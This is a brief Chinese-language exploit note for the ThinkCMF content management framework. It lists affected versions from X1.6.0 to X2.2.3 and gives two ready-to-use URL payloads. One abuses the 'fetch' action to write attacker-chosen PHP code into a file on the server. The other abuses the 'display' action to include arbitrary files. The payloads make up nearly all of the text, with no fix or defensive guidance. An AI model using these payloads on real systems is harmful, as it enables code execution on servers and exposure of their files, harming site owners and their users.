# ThinkCMF框架任意文件包含

Ver：
ThinkCMF X1.6.0  
ThinkCMF X2.1.0  
ThinkCMF X2.2.0  
ThinkCMF X2.2.1  
ThinkCMF X2.2.2  
ThinkCMF X2.2.3  

Exp：  
第一种：  
通过构造a参数的fetch方法，可以不需要知道文件路径就可以把php代码写入文件phpinfo版payload如下：  
```
?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('test.php','<?php phpinfo(); ?>')</php>
```
第二种：  
通过构造a参数的display方法，实现任意文件包含漏洞
```
?a=display&templateFile=README.md
```
